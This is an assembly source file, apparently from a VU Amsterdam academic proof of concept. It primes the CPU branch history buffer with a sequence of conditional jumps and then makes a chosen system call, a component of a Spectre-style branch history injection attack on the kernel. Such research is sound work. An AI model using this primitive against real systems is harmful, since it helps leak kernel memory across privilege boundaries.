; Thursday, September 9th 2021
;
; Enrico Barberis - e.barberis@vu.nl
; Pietro Frigo - p.frigo@vu.nl
; Marius Muench - m.muench@vu.nl
; Herbert Bos - herbertb@cs.vu.nl
; Cristiano Giuffrida - giuffrida@cs.vu.nl
;
; Vrije Universiteit Amsterdam - Amsterdam, The Netherlands

;Must match with main.c MAX_HISTORY_SIZE !
%define MAX_HISTORY_SIZE 256

section .text

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; fill_bhb
; - rdi: ptr to 128 bit array
; - rsi: syscall number
; - rdx: syscall arg1
; - rcx: syscall arg2
; - r8:  syscall arg3
; - r9:  usr_r12
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
align 0x1000
global fill_bhb
fill_bhb:

    push    r12

    %assign i 0
    %rep MAX_HISTORY_SIZE
    movzx   rax, byte [rdi]
    inc     rdi
    cmp     rax, 1
    ;align   0x10
    je      next_%+i
    next_%+i:
    %assign i i+1
    %endrep

global victim_syscall
victim_syscall:
    mov rax, rsi
    mov rdi, rdx
    mov rsi, rcx
    mov rdx, r8
    mov r12, r9
    syscall

    pop     r12
    ret

